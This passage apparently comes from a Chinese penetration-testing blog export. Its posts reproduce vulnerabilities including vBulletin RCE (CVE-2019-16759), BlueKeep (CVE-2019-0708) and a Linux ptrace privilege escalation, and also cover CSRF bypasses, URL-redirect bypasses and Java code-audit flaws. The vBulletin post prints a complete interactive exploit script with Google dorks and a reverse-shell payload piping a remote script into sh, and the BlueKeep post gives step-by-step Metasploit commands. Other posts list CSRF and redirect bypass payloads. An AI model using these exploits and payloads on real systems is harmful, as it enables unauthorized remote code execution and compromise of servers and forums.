网站：https://curl.trillworks.com","categories":[{"name":"Python","slug":"Python","permalink":"http://www.vkxss.top/categories/Python/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"CVE-2019-13272-Linux本地提权漏洞","slug":"CVE-2019-13272","date":"2019-10-08T07:30:08.000Z","updated":"2019-10-09T08:00:57.618Z","comments":true,"path":"2019/10/08/CVE-2019-13272/","link":"","permalink":"http://www.vkxss.top/2019/10/08/CVE-2019-13272/","excerpt":"","text":"漏洞概述： 影响范围 复现环境 漏洞复现 漏洞概述： 当调用PTRACE_TRACEME时，ptrace_link函数将获得对父进程凭据的RCU引用，然后将该指针指向get_cred函数。但是，对象struct cred的生存周期规则不允许无条件地将RCU引用转换为稳定引用。 PTRACE_TRACEME获取父进程的凭证，使其能够像父进程一样执行父进程能够执行的各种操作。如果恶意低权限子进程使用PTRACE_TRACEME并且该子进程的父进程具有高权限，该子进程可获取其父进程的控制权并且使用其父进程的权限调用execve函数创建一个新的高权限进程。攻击者最终控制具有高权限的两个进程ptrace关系，可以被用来ptrace，suid二进制文件并获得root权限。 影响范围 目前受影响的Linux内核版本： Linux Kernel &lt; 5.1.17 复现环境 exploit下载地址： https://github.com/vkbiu/CVE/tree/master/CVE-2019-13272 Ubuntu 4.13.0-38-generic Kali未复现成功，普通用户执行gcc，提示权限不够 漏洞复现 利用效果如下图:","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"Linux本地提取","slug":"Linux本地提取","permalink":"http://www.vkxss.top/tags/Linux本地提取/"}]},{"title":"vBulletin 5.x 前台远程代码执行漏洞复现","slug":"CVE-2019-16759","date":"2019-09-25T07:30:08.000Z","updated":"2019-09-25T16:45:55.068Z","comments":true,"path":"2019/09/25/CVE-2019-16759/","link":"","permalink":"http://www.vkxss.top/2019/09/25/CVE-2019-16759/","excerpt":"","text":"0X00 简介 0X01 CVE编号 0X02 漏洞威胁等级 0X03 影响范围 0X04 漏洞描述 0X05 漏洞POC 0X06 漏洞复现 0X07 修复建议 0X08 Reference 0X00 简介 vBulletin 是一个商用的论坛程序，在全球拥有数万用户且增长速度很快。该论坛采用PHP Web语言及MySQL数据库的方式进行架构。《财富》 500强和Alexa排名前100万的公司网站大部分都在使用的一款互联网论坛程序。 0X01 CVE编号 CVE-2019-16759 相关信息链接：https://seclists.org/fulldisclosure/2019/Sep/31 0X02 漏洞威胁等级 高危 0X03 影响范围 CVE-2019-16759漏洞影响：vBulletin 5.0.0 到最新 5.5.4版本 0X04 漏洞描述 漏洞通过请求ajax/render/widget_php进行模板注入触发代码执行。 0X05 漏洞POC12345678910111213141516171819202122232425262728293031#!/usr/bin/python## vBulletin 5.x 0day pre-auth RCE exploit# # This should work on all versions from 5.0.0 till 5.5.4## Google Dorks:# - site:*.vbulletin.net# - &quot;Powered by vBulletin Version 5.5.4&quot;import requestsimport sysif len(sys.argv) != 2: sys.exit(&quot;Usage: %s &lt;URL to vBulletin&gt;&quot; % sys.argv[0])params = &#123;&quot;routestring&quot;:&quot;ajax/render/widget_php&quot;&#125;while True: try: cmd = raw_input(&quot;vBulletin$ &quot;) params[&quot;widgetConfig[code]&quot;] = &quot;echo shell_exec(&apos;&quot;+cmd+&quot;&apos;); exit;&quot; r = requests.post(url = sys.argv[1], data = params) if r.status_code == 200: print r.text else: sys.exit(&quot;Exploit failed! :(&quot;) except KeyboardInterrupt: sys.exit(&quot;\\nClosing shell...&quot;) except Exception, e: sys.exit(str(e)) 0X06 漏洞复现 漏洞地址： 访问漏洞URL，修改请求方式为POST： 然后在post参数中可输入以下任意payload验证： payload1：widgetConfig[code] = echo shell_exec(‘id’); payload2：widgetConfig[code] = echo shell_exec(‘whoami’); payload3：widgetConfig[code] = echo shell_exec(‘uname-a’); payload4：widgetConfig[code] = echo shell_exec(‘curl https://shell.now.sh/yourip:1337 | sh’); 注意使用payload4反弹shell，参考如下： Reverse Shell as a Service https://github.com/lukechilds/reverse-shell 在你的机器：nc -l 1337 在目标机器上：curl https://shell.now.sh/yourip:1337 | sh 反弹Shell会话 0X07 修复建议 上waf或防火墙配置规则拦截,等待官方修复打补丁。 0X08 Reference 参考链接：https://www.youtube.com/watch?v=ymLRqsbCuVY","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-16759","slug":"CVE-2019-16759","permalink":"http://www.vkxss.top/tags/CVE-2019-16759/"}]},{"title":"绕过CSRF防御总结","slug":"渗透测试-绕过CSRF防御总结","date":"2019-09-19T07:30:08.000Z","updated":"2020-01-09T02:15:27.152Z","comments":true,"path":"2019/09/19/渗透测试-绕过CSRF防御总结/","link":"","permalink":"http://www.vkxss.top/2019/09/19/渗透测试-绕过CSRF防御总结/","excerpt":"","text":"一、 先了解下CSRF_TOKEN 1. 什么是CSRF_TOKEN 2. 为什么CSRF-Token可以写在COOKIE里 3. 常见csrf_token使用方式有两种： 3.1 Synchronizer token pattern(STP) 3.2 Cookie-to-header token 二、绕过CSRF防御总结 2.1 所有的CSRF 2.1.1 点击劫持 2.1.2 更改请求方法 三 、CSRF token的防御措施 3.1 删除token参数或发送空token 3.2 令牌共享 3.3 Session固定 3.4 窃取token 3.5 Jsonp劫持获取csrf_token 3.6 解码CSRF令牌 3.6 修改请求方法 四、 Referer字段的CSRF防御 4.1 Referer值为空或移除referer字段 4.2 自建服务器路径带referer字段名 4.3 利用URL跳转 4.3 绕过正则表达式 一、 先了解下CSRF_TOKEN1. 什么是CSRF_TOKEN 就是防止跨站请求伪造（CSRF）的 2. 为什么CSRF-Token可以写在COOKIE里 将csrf令牌写入Cookie，是因为：服务器进行csrf防御校验的时候，是拿用户http请求体中的token参数值和cookie中的csrftoken值进行比对。如果值一样了，操作才被允许执行。 因为同源策略的限制，当正常用户通过账号密码等方式登陆网站A后，在不注销账号或当前COOKIE失效之前，再次访问网站A时（协议、IP、端口号相同则属于同源）浏览器会自动在HTTP请求包中带上该网站用户登陆后的COOKIE信息。这也就是为什么同源策略无法防御csrf的原因。 也就是说我们对CSRF的理解应为：攻击者借用用户COOKIE执行非用户本意的操作。 在此攻击过程中用户COOKIE对于攻击者来说是不可见的是未知的、不可见的，攻击者能做到仅仅是借用COOKIE，而COOKIE里面具体写了什么，攻击者是不知道的。又因为COOKIE里的信息对于攻击者来说是不可预知的，无法伪造的，所以将CSRF-TOKEN写在COOKIE中符合就CSRF防御思想中的不可预知原则。 3. 常见csrf_token使用方式有两种：3.1 Synchronizer token pattern(STP) 对于每个request，在服务器端生成一个新的csrf_token，并将其返回在页面的表单中。在服务器端每次接收到请求时，都会验证表单中是否包含正确的csrf_token。由于第三方网站无法得知正确的csrf_token，所以无法进行csrf攻击。 1234567get_token = get_random_token() return &#123; &lt;form&gt; &lt;input name=field1&gt;&lt;/input&gt; &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=#&#123;get_token()&#125; /&gt; &lt;/form&gt;&#125; 这个方法的好处是客户端不需要支持javascript，因此通用于所有的网站。坏处是由于服务器端对于每个请求都会更换csrf_token，因此他需要保证用户提交的表单是用户最近一次请求的表单。如果用户通过多个tab同时浏览该网站，那么往往会导致用户提交的表单不是最新的那一个。 3.2 Cookie-to-header token 第二个方法是为每个session生成一个csrf_token，随后将csrf_token保存到cookie中，之后通过javascript在每次请求时将csrf_token设置到http header中的X-Csrf-Token属性中。再在服务器端比较Cookie的csrf_token与header中的token是否一致。 12345//当用户登录时设置CookieSet-Cookie: Csrf-token=i8XNjC4b8KVok4uw5RftR38Wgp2BFwql; expires=Thu, 23-Jul-2015 10:25:33 GMT; Max-Age=31449600; Path=///当用户发送请求时设置Http Header中的X-Csrf-TokenX-Csrf-Token: i8XNjC4b8KVok4uw5RftR38Wgp2BFwql 二、绕过CSRF防御总结 注：原文链接：https://medium.com/swlh/bypassing-csrf-protection-c9b217175ee（需要科学上网） CSRF漏洞很容易就可以被发现并利用。一眼看去很多站点好像在这方面都做得不错：当你检查针对敏感操作的请求时，他们往往会实施CSRF保护。有时候可能是一个在请求主体中的CSRF token，也有可能是一个referer字段检测，或者有时是一个特殊的HTTP头字段或者cookie字段。 但是CSRF的防御不代表它就不可以被绕过。今天我们讨论一些我如何绕过CSRF防御措施的技术。 2.1 所有的CSRF 不管哪种CSRF防御措施部署，你都可以先尝试如下两件事：点击劫持和更改请求方法。 2.1.1 点击劫持 在同一个功能端点利用点击劫持会绕过所有CSRF防御。因为从技术上讲，请求确实来自合法站点，如果易受攻击的端点所在页面容易遭受点击劫持攻击，那么所有的CSRF保护将变得没有效果，攻击者可以任意执行CSRF攻击。 2.1.2 更改请求方法 另外值得一试的方法就是更改请求的方法。如果要伪造的敏感请求是通过POST方法发送的，那么尝试将其转换为GET请求。如果操作时通过GET方法发送的，那么尝试转换为POST方法。应用程序可能仍然执行操作，且通常没有任何保护机制。 例如，如下请求： 123456POST /change_passwordPOST body:new_password=qwerty可以被改写成GET /change_password?new_password=qwerty 三 、CSRF token的防御措施 因为一个站点使用了CSRF token不代表这个token是有效验证对应请求操作的，可以尝试如下方法绕过CSRF的token保护。 3.1 删除token参数或发送空token 不发送token也可以正常请求数据是因为这种逻辑错误在应用程序中非常常见：应用程序有时会在token存在的时候或者token参数不为空的时候检查token的有效性。这种情况下，如果一个请求不包含token或者token值为空，那么也是有可能绕过CSRF的防御的。 例如，合法请求如下 12345678910111213POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b那么实施这种请求：POST /change_passwordPOST body:new_password=qwerty或这种：POST /change_passwordPOST body:new_password=qwerty&amp;csrf_tok= 3.2 令牌共享 应用程序可能只是检查token是否合法，但是不检查token是否确实归属于当前用户。如果是这种情况的话，你可以在payload中硬编码一个合法有效的token即可。 如果一个受害者的token是871caef0757a4ac9691aceb9aad8b65b，你自己的token是YOUR_TOKEN，那么你可以很容易获取到自己的token但很难获取到受害者的token。尝试在payload中提供自己的token来绕过CSRF防御。 换句话说，原本应该发送如下请求： 12345678POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=871caef0757a4ac9691aceb9aad8b65b但是改成发送这个请求：POST /change_passwordPOST body:new_password=qwerty &amp;csrf_tok=YOUR_TOKEN 3.3 Session固定 有时候站点使用一个双提交cookie作为一个CSRF的防御措施。这个表明这个请求需要包含一个cookie，其值为随机token值，且同时在请求参数中也有一个字段值为该随机token值。如果值相同，那么请求是合法的。这种防御形式是非常常见的。 如果一个双提交cookie用在了防御措施中，那么这个应用有可能没有将有效的token保存在服务器端。所以它没有办法指定token是否合法，并且也有可能很少检查cookie中的token值和参数中token值是不是一样的。这代表你可以发送一个假token，然后仍然可以有效实施CSRF攻击。 这种攻击包含两个步骤：第一步，你使用一个session固定技术去确认受害者的浏览器使用的是你提供的包含假token的session，然后第二步在参数中使用同一个token来执行这个CSRF攻击。 session固定。这是一个可以让你控制受害者的cookie存储的攻击； 123456执行如下请求来实施CSRF攻击POST /change_passwordCookie: CSRF_TOK=FAKE_TOKEN;POST body:new_password=qwerty &amp;csrf_tok=FAKE_TOKEN 3.4 窃取token 配合XSS，前提是网站不存在XSS漏洞或者CSRF-Token具备httponly属性 重定向、web缓存欺骗、clickjacking等都可能导致token泄露 3.5 Jsonp劫持获取csrf_token https://www.jianshu.com/p/1cda296cf7d2 3.6 解码CSRF令牌 尝试进行MD5或Base64编码 3.6 修改请求方法 post改为get 四、 Referer字段的CSRF防御 如果attack.com是一个可控的域名，bank.com是一个要攻击的域名。这个站点没有使用CSRF token但是检查了referer字段。你应该怎么做？ 4.1 Referer值为空或移除referer字段 首先，我们对空Referer的定义为，Referer 头部的内容为空，或者，一个HTTP请求中根本不包含Referer头部 和发送一个空token值相同，有时候你只需简单地移除referer字段就可以绕过CSRF防御。你可以添加如下meta标签到存在漏洞的页面。 扩展测试面：例如jsonp劫持 123&lt;meta name=&quot;referrer&quot; content=&quot;never&quot;&gt;或&lt;meta name =&quot;referrer&quot; content =&quot;no-referrer&quot;&gt; 应用程序可能只是在发送后才会验证，这种情况下你可以绕过其CSRF防御。 4.2 自建服务器路径带referer字段名 原理就是在路径上创建成原本referer中有的字段名，如果校验只是判断是否包含。 案例： https://www.zybuluo.com/1kbfree/note/1210937 4.3 利用URL跳转 案例： https://www.zybuluo.com/1kbfree/note/1239095 4.3 绕过正则表达式 如果referer检查是基于白名单的，你可以尝试绕过验证URL的正则表达式。例如，你可以尝试在referer的URL中将受害者域名置于二级域名区域或者URL目录区域。 如果一个站点在referer字段检查“bank.com”字段，那么“bank.com.attacker.com”或”attakcer.com/bank.com”可能可以绕过这种检测。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"前端安全-CSRF","slug":"前端安全-CSRF","permalink":"http://www.vkxss.top/tags/前端安全-CSRF/"}]},{"title":"路径遍历的RCE","slug":"渗透测试-路径遍历的RCE","date":"2019-09-10T07:30:08.000Z","updated":"2019-11-12T08:04:54.794Z","comments":true,"path":"2019/09/10/渗透测试-路径遍历的RCE/","link":"","permalink":"http://www.vkxss.top/2019/09/10/渗透测试-路径遍历的RCE/","excerpt":"","text":"0x00 路径遍历的RCE 0x00 路径遍历的RCE 如下是利用目录遍历，配合文件上传漏洞的一个RCE的记录。 条件： 存在目录遍历漏洞 存在文件上传漏洞 已知上传的路径，无访问权限的情况 首先，在浏览时，我发现一个引起我注意的参数，frameManagerPath是base64参数。此路径始终返回javascript代码。就像下面的图像： 解码该值后，我可以注意到该值是文件的相对路径。 接下来，步骤是将字符串/ etc / passwd编码为base64格式，以尝试遍历某些路径，令我惊讶的是:)。OBS：L2V0Yy9wYXNzd2Q = == / etc / passwd 但是，在找到该路径遍历之前，我发现了一个上传错误的文件，使我能够上传 任何类型的文件，但是我无法访问/ wwwroot / path：/中的根目录。下图显示了此文件上传的请求和响应。 下一步，我将显示一个Webshel​​l，如下所示。 通过将这两个项目结合在一起，可以通过路径遍历访问webshel​​l，并通过webshel​​l在服务器上执行命令。cmFudC9ibG9nL3BhdGh0cmF2ZXJzYWwvaW1hZ2UwNS5wbmc = ==“路径wwwroot编码为em base64（模糊）” 请求 响应 下一个图像说明了最终结果。","categories":[{"name":"WEB安全","slug":"WEB安全","permalink":"http://www.vkxss.top/categories/WEB安全/"}],"tags":[{"name":"WEB渗透测试","slug":"WEB渗透测试","permalink":"http://www.vkxss.top/tags/WEB渗透测试/"}]},{"title":"CVE-2019-0708 远程桌面代码执行漏洞复现","slug":"CVE-2019-0708","date":"2019-09-07T07:30:08.000Z","updated":"2019-09-20T02:01:32.249Z","comments":true,"path":"2019/09/07/CVE-2019-0708/","link":"","permalink":"http://www.vkxss.top/2019/09/07/CVE-2019-0708/","excerpt":"","text":"0X00 简介 0X01 环境准备 0x02 漏洞复现 0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具 0X00 简介 Microsoft Windows是美国微软公司发布的视窗操作系统。远程桌面连接是微软从Windows 2000 Server开始提供的功能组件。 2019年5月14日，微软发布了月度安全更新补丁，修复了远程桌面协议（RDP）远程代码执行漏洞。未经身份验证的攻击者利用该漏洞，向目标 Windows主机发送恶意构造请求，可以在目标系统上执行任意代码。 近日，Metasploit发布了该漏洞的利用模块，GitHub网站上也公开了该漏洞的利用代码，引起了安全研究人员的广泛关注。目前该漏洞利用仅对Windows 7 SP1 x64与Windows 2008 R2 x64（非系统默认配置）系统版本有效，在虚拟机环境下复现成功。 0X01 环境准备 攻击机:kali 靶机：Win7 12Windows7 SP1下载链接ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/ 0x02 漏洞复现 msf必须使用msf5（#msfupdate） 下载exp:kali攻击机下载metasploit攻击脚本，kali中执行以下命令 1234wget https://raw.githubusercontent.com/rapid7/metasploit-framework/edb7e20221e2088497d1f61132db3a56f81b8ce9/lib/msf/core/exploit/rdp.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/rdp_scanner.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rbwget https://github.com/rapid7/metasploit-framework/raw/edb7e20221e2088497d1f61132db3a56f81b8ce9/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb 图：下载攻击载荷 做如下替换（大部分人msf都装在如下位置） 12345678rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb 做如下替换（我的位置） 12345678rdp.rb -&gt; /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rbrdp_scanner.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rbcve_2019_0708_bluekeep.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rbcve_2019_0708_bluekeep_rce.rb -&gt; /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb reload_all 重新加载所有的模块，将新添加的模块加载上。成功如下图： 图：成功加载攻击载荷 使用攻击载荷 1234&gt; use exploit/rdp/cve_2019_0708_bluekeep_rce&gt; set rhosts 靶机IP&gt; set target 3 （根据靶机而定）&gt; exploit 成功利用！！！！ 1&gt; set target 3 图：蓝屏 再来一次！！！！ 1&gt; set target 1 图：会话 0x03 漏洞检测修复工具&amp;批量快速扫描检测工具&amp;热补丁工具 下载页面： 1https://www.qianxin.com/other/CVE-2019-0708 使用说明： 12345&gt;下载文件进行解压。&gt;使用win+R快捷键或开始菜单选择“运行”，输入cmd。调起命令行工具。&gt;在命令行工具，执行命令到工具所在文件夹&gt;输入命令对应功能，启用热补丁命令：QKShield.exe /enable ；禁用热补丁命令：QKShield.exe/disable 。&gt;重启系统后，需要重新运行命令行来启用热补丁 实现效果： 123456789101112131415在工具支持的系统中启用热补丁后，用漏洞扫描工具扫描结果为没有漏洞。漏洞扫描工具下载地址：https://www.qianxin.com/other/CVE-2019-0708支持系统：Windows XP for 32-bit Systems Service Pack 3Windows 7 for 32-bit SystemsWindows 7 for x64-based SystemsWindows 7 for 32-bit Systems Service Pack 1Windows 7 for x64-based Systems Service Pack 1Windows Server 2003 for 32-bit Systems Service Pack 2Windows Server 2003 R2 for 32-bit Systems Service Pack2Windows Server 2008 for 32-bit Systems Service Pack 2Windows Server 2008 for 32-bit Systems Service Pack 2(Server Core installation)Windows Server 2008 for x64-based Systems Service Pack2Windows Server 2008 for x64-based Systems Service Pack2 (Server Core installation)Windows Server 2008 R2 for x64-based Systems ServicePack 1Windows Server 2008 R2 for x64-based Systems ServicePack 1 (Server Core installation) 暂不支持的系统： 123Windows Server 2003 for x64-based Systems Service Pack2Windows Server 2008 for Itanium-Based Systems ServicePack 2Windows Server 2008 R2 for Itanium-Based SystemsService Pack 1","categories":[{"name":"CVE-2019","slug":"CVE-2019","permalink":"http://www.vkxss.top/categories/CVE-2019/"}],"tags":[{"name":"CVE-2019-0708","slug":"CVE-2019-0708","permalink":"http://www.vkxss.top/tags/CVE-2019-0708/"}]},{"title":"Insecure Randomness","slug":"代码审计-Insecure Randomness","date":"2019-08-22T06:10:40.000Z","updated":"2019-11-19T06:38:29.828Z","comments":true,"path":"2019/08/22/代码审计-Insecure Randomness/","link":"","permalink":"http://www.vkxss.top/2019/08/22/代码审计-Insecure Randomness/","excerpt":"","text":"1、Insecure Randomness 1.1、描述： 1.2、审计方法： 1.3、漏洞示例: 1.4、漏洞危害： 1.5、修复方案： 1、Insecure Randomness1.1、描述： 伪随机数生成器（PRNG）使用确定性数学算法来产生具有良好统计属性的数字序列。但是这种数字序列并不具有真正的随机特性。伪随机数生成器通常以一个算术种子值为起始。算法使用该种子值生成一个输出以及一个新的种子，这个种子又被用来生成下一个随机值，以此类推。Java API 提供了伪随机数生成器（PRNG）—— java.util.Random类。这个伪随机数生成器具有可移植性和可重复性。因此，如果两个java.util.Random类的实例创建时使用的是相同的种子值，那么对于所有的Java实现，它们将生成相同的数字序列。在系统重启或应用程序初始化时，Seed值总是被重复使用。在一些其他情况下，seed值来自系统时钟的当前时间。攻击者可以在系统的一些安全脆弱点上监听，并构建相应的查询表预测将要使用的seed值。 1.2、审计方法： 全局搜索以下关键词 “random” 1.3、漏洞示例: 例如在易于猜测的密码、可预测的加密密钥、验证码生成、抽奖活动、UUID生成、SessionID生成、Token生成、CSRF Token、找回密码Token、游戏（随机元素的生成）、密码应用场景、生成密钥：对称密码，消息认证、生成密钥对：公钥密码，数字签名、生成IV： 用于分组密码的CBC，CFB和OFB模式、生成nonce: 用于防御重放攻击; 分组密码的CTR模式、生成盐：用于基于口令的密码PBE等，可能会降低系统安全性。 图1：漏洞代码 1.4、漏洞危害： 生成的随机数很容易预测，可能会降低系统安全性。 1.5、修复方案： 因此，java.util.Random类不能用于安全敏感应用或者敏感数据保护。应使用更加安全的随机数生成器，例如java.security.SecureRandom类。 图2：修复代码","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"Null Dereference","slug":"代码审计-Java-Null Dereference","date":"2019-08-20T07:23:43.000Z","updated":"2019-11-19T06:38:38.248Z","comments":true,"path":"2019/08/20/代码审计-Java-Null Dereference/","link":"","permalink":"http://www.vkxss.top/2019/08/20/代码审计-Java-Null Dereference/","excerpt":"","text":"1、Null Dereference（空指针异常） 1.1、产生原因： 2.2、修复方案： 1、Null Dereference（空指针异常）1.1、产生原因： 当违反程序员的一个或多个假设时，通常会出现 null 指针异常。如果程序明确将对象设置为null，但稍后却间接引用该对象，则将出现 dereference-after-store 错误。此错误通常是因为程序员在声明变量时将变量初始化为 null。大部分空指针问题只会引起一般的软件可靠性问题，但如果攻击者能够故意触发空指针间接引用，攻击者就有可能利用引发的异常绕过安全逻辑，或致使应用程序泄漏调试信息，这些信息对于规划随后的攻击十分有用。 示例：在下列代码中，程序员将变量 foo 明确设置为 null。稍后，程序员间接引用 foo，而未检查对象是否为 null 值。 图1：引起Null Dereference漏洞的代码 2.2、修复方案： 在间接引用可能为 null 值的对象之前，请务必仔细检查。如有可能，在处理资源的代码周围的包装器中纳入 null 检查，确保在所有情况下均会执行 null 检查，并最大限度地减少出错的地方。 图2：修复Null Dereference漏洞后的代码","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"敏感信息硬编码在程序中","slug":"代码审计-敏感信息硬编码在程序中","date":"2019-08-20T04:25:40.000Z","updated":"2020-01-19T07:28:31.772Z","comments":true,"path":"2019/08/20/代码审计-敏感信息硬编码在程序中/","link":"","permalink":"http://www.vkxss.top/2019/08/20/代码审计-敏感信息硬编码在程序中/","excerpt":"","text":"1、敏感信息硬编码在程序中 1.1、描述： 1.2、审计方法： 1.3、漏洞示例: 1.4、漏洞危害： 1.5、修复方案： 1、敏感信息硬编码在程序中1.1、描述： 如果将敏感信息（包括口令和加密密钥）硬编码在程序中，可能会将敏感信息暴露给攻击者。任何能够访问到class文件的人都可以反编译class文件并发现这些敏感信息。因此，不能将信息硬编码在程序中。同时，硬编码敏感信息会增加代码管理和维护的难度。 1.2、审计方法： 全局搜索以下关键词 “password” 1.3、漏洞示例: 恶意用户可以使用javap -c IPaddress命令来反编译class来发现其中硬编码的服务器IP地址。反编译器的输出信息透露了服务器的明文IP地址：172.16.254.1。 图1：错误代码 1.4、漏洞危害： 很容易被攻击者利用，导致系统敏感信息泄露。 1.5、修复方案： 敏感信息存放在配置文件或数据库中并加密存储。(金融行业安全系数更高) 这个正确代码示例从一个安全目录下的外部文件获取服务器IP地址。并在其使用完后立即从内存中将其清除可以防止后续的信息泄露。 图2：正确代码","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"任意文件读取","slug":"代码审计-任意文件读取","date":"2019-08-19T06:13:12.000Z","updated":"2019-11-19T06:38:25.068Z","comments":true,"path":"2019/08/19/代码审计-任意文件读取/","link":"","permalink":"http://www.vkxss.top/2019/08/19/代码审计-任意文件读取/","excerpt":"","text":"1、Any File Read（任意文件读取） 1.1、描述： 1.2、审计方法： 1.3、漏洞示例: 1.3、漏洞危害: 1.4、修复方案： 1、Any File Read（任意文件读取）1.1、描述： 任意文件读取漏洞（Unrestricted File Upload），是一种常见的Web安全漏洞，因Web程序提供的文件查看下载、附件下载等功能存在安全缺陷，导致通过修改文件路径就能够查看和下载任意文件，这些文件包括：源代码文件、系统文件（/etc/passwd、C:/boot.ini等）、配置文件（config.php、/WEB-INF/web.xml、web.config等），造成网站敏感信息泄露，严重危害网站安全。 1.2、审计方法： 全局搜索以下关键词: “fileName”, “filePath”, “getFile”, “getWriter”, “MultipartFile”, “createNewFile”, “FileInputStream” 1.3、漏洞示例: 代码在 downloadFile()函数中获取请求参数中的affixalName的值，然后赋值给 FileName 变量，接着在 196 行处通过拼接字符串赋值给downPath 变量，然后在 198 行处调用 download 函数并把 downPath 的值传进函数，download 函数的代码如下: 图1：漏洞代码 download 函数把 filePath 处的文件写到 http 响应中，在整个流程中并没有对文件名的合法 性进行检查，存在任意文件下载漏洞，如通过把 affixalName 的值设置 为../../../WEB-INF/web.xml 可以下载网站的 web.xml 文件。 图2：漏洞代码 图3：漏洞代码 1.3、漏洞危害: 任意文件读取是属于文件操作漏洞的一种，一般任意文件读取漏洞可以读取的配置信息甚至系统重要文件。严重的话，就可能导致SSRF，进而漫游至内网。 1.4、修复方案： 指定下载路径以防止用户读取和下载指定目录以外的文件。","categories":[{"name":"JAVA","slug":"JAVA","permalink":"http://www.vkxss.top/categories/JAVA/"}],"tags":[{"name":"Java代码审计","slug":"Java代码审计","permalink":"http://www.vkxss.top/tags/Java代码审计/"}]},{"title":"如何绕过URL限制","slug":"渗透测试-如何绕过URL限制","date":"2019-07-20T04:25:40.000Z","updated":"2019-09-23T08:02:38.060Z","comments":true,"path":"2019/07/20/渗透测试-如何绕过URL限制/","link":"","permalink":"http://www.vkxss.top/2019/07/20/渗透测试-如何绕过URL限制/","excerpt":"","text":"1、如何绕过URL限制 1.1、描述： 1.2、正常思路： 1.3、payload： 1.4、Bypass 0x01 利用问号绕过限制 0x02 利用反斜杠和正斜杠绕过限制 0x03 利用@绕过URL限制 0x04 利用白名单缺陷绕过限制 0x05 多重验证&amp;跳转绕过限制 0x06 点击触发达到绕过URL跳转限制 0x07 利用xip.io绕过 0x08 利用超链接绕过可信站点限制 0x09 POST参数中的URL跳转 0x10 利用#号绕过 0x09 FUZZ 1、如何绕过URL限制1.1、描述： URL重定向漏洞（URL redirection vulnerability），是一种常见的Web安全漏洞，由于网站URL重定向功能设计不当，没有验证跳转的目标URL是否合法，用户可通过此漏洞跳转到任意网站，这会导致可通过该网站跳转到存在木马、病毒的网站或者钓鱼网站，损害网站用户权利、网站名誉。 1.2、正常思路： 就是直接替换后面的URL来检测是否存在任意URL跳转，如果不存在，就直接返回到它自己的域名，如果存在，就跳转到你指定的URL 1.3、payload：123456789101112- ///www.baidu.com/%2f%2e%2e- /https://%5cbaidu.com/- //www.baidu.com- /www.baidu.com- https://www.google.com/www.baidu.com- /%2Fbaidu%252Ecom- http://www.google.com\\.baidu.com- http://www.google.com\\@baidu.com- http://www.google.com\\#baidu.com- http://www.google.com\\?baidu.com- http://www.google.com\\\\baidu.com- http://www.google.com\\baidu.com: 1.4、Bypass0x01 利用问号绕过限制 利用问号，这是一个特性，利用问号可以成功绕过URL限制比如：http://www.aaa.com/acb?Url=http://login.aaa.com 这是一个跳转链接，跳转到它的二级域名下，那么这个问号放哪里可以绕过呢？其实就是放到它自身的域名前面也就是你添加的想要跳转的域名的后面，如：http://www.aaa.com/acb?Url=http://test.com?login.aaa.com 那么，它其实是会跳转到这个test.com域名下，这个域名是我想要跳转的任意域名，而后面的它自身域名一定要带上，不带上就无法辅助用问号?这个特性来跳转到指定域名了，而跳转后，问号和问号后面的内容会变为这样：http://www.test.com/?login.aaa.com 1payload：http://www.test.com/abc？url=http//payload.com?test1.com 0x02 利用反斜杠和正斜杠绕过限制 比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 同样是在它本身域名前加上正斜杠，然后正斜杠前面跟上你想跳转的域名地址。如：http://www.aaa.com/acb?Url=http://test.com/login.aaa.com反斜杠有三种思路两个反斜杠绕过方法比如：http://www.aaa.com/acb?Url=http://login.aaa.com/ 